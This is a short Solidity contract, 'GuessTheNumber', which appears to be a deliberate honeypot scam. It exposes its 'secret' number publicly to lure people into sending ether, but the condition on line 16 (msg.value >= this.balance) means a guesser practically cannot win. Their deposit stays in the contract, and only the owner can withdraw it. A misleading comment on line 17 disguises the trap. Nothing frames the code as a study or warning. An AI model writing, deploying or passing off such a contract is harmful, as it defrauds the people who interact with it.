1 pragma solidity ^0.4.17;
2 contract GuessTheNumber {
3 
4     address public Owner = msg.sender;
5     uint public SecretNumber = 24;
6    
7     function() public payable {
8     }
9    
10     function Withdraw() public {
11         require(msg.sender == Owner);
12         Owner.transfer(this.balance);
13     }
14     
15     function Guess(uint n) public payable {
16         if(msg.value >= this.balance && n == SecretNumber && msg.value >= 0.05 ether) {
17             // Previous Guesses makes the number easier to guess so you have to pay more
18             msg.sender.transfer(this.balance+msg.value);
19         }
20     }
21 }